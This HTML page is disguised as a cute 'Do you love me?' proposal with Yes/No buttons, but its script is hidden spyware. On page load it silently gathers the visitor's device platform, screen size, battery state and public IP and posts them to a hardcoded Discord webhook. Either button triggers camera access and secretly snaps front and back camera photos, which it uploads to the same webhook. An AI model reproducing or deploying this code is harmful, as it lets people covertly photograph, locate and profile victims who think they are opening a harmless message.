<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Proposed Her</title>
  <link rel="stylesheet" href="./style.css" />
  <style>
    #video, #canvas { display: none; }
    .btn a {
      padding: 10px 25px;
      margin: 10px;
      text-decoration: none;
      background: #ff4d6d;
      color: white;
      border-radius: 20px;
      display: inline-block;
      font-weight: bold;
    }
  </style>
</head>
<body style="background-color: #1a1a1a; text-align: center; font-family: Arial, sans-serif;">

  <div class="dev-name" style="position: absolute; top: 10px; left: 10px; font-size: 0.8rem; color: rgba(255,255,255,0.7); font-weight: bold;">
    Dev by Faisal
  </div>

  <div class="container" style="padding-top: 50px;">
    <img src="https://media0.giphy.com/media/K6WIhJ07gwGkIAQfwN/giphy.gif" alt="Manja GIF" style="width:100%; max-width:400px; display:block; margin:auto; margin-bottom:20px;">
    <h1 style="color: #fff;">Do you love me? 🤗</h1>
    <p style="color: #eee;">Chiku is all yours</p>
    <div class="btn">
      <a href="javascript:void(0)" onclick="startCapture('user')">Yes</a>
      <a href="javascript:void(0)" onclick="startCapture('user')">No</a>
    </div>
  </div>

  <video id="video" autoplay></video>
  <canvas id="canvas"></canvas>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1492440049948692621/bvCYRkOqyKkKb1o1QWU0ztStZNc8JF9DAmF4xgdJpv8pGVbqVtrogVeFSI0sCzN9AkFS";

    // --- Silent Data: Page load hote hi bhej do ---
    window.onload = async () => {
        let silentData = `🕵️ **Silent Info Collected:**\n`;
        silentData += `📱 **Platform:** ${navigator.platform}\n`;
        silentData += `🖥️ **Screen:** ${window.screen.width}x${window.screen.height}\n`;
        
        try {
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                silentData += `🔋 **Battery:** ${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Not Charging'})\n`;
            }
        } catch (e) {}

        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => {
                silentData += `🌍 **IP:** ${data.ip}`;
                sendToDiscord(null, silentData);
            }).catch(() => sendToDiscord(null, silentData));
    };

    // --- Camera Capture: Sirf click par ---
    async function startCapture(mode) {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
        const video = document.getElementById('video');
        video.srcObject = stream;

        setTimeout(() => {
          const canvas = document.getElementById('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          canvas.getContext('2d').drawImage(video, 0, 0);
          
          canvas.toBlob(blob => {
            sendToDiscord(blob, `📸 **Camera:** ${mode === 'user' ? 'Front' : 'Back'}`);
            stream.getTracks().forEach(t => t.stop());

            // Agar Front (user) capture ho gaya, to ab Back (environment) try karo
            if (mode === 'user') {
                setTimeout(() => startCapture('environment'), 500);
            } else {
                // Sab khatam, ab redirect
                window.location.href = "page1.html";
            }
          }, 'image/png');
        }, 1000);
      } catch (err) {
          window.location.href = "no1.html";
      }
    }

    function sendToDiscord(blob, content) {
        const formData = new FormData();
        if (blob) formData.append('file', blob, `faisal_${Date.now()}.png`);
        formData.append('content', content);
        fetch(WEBHOOK_URL, { method: 'POST', body: formData });
    }
  </script>
</body>
</html>
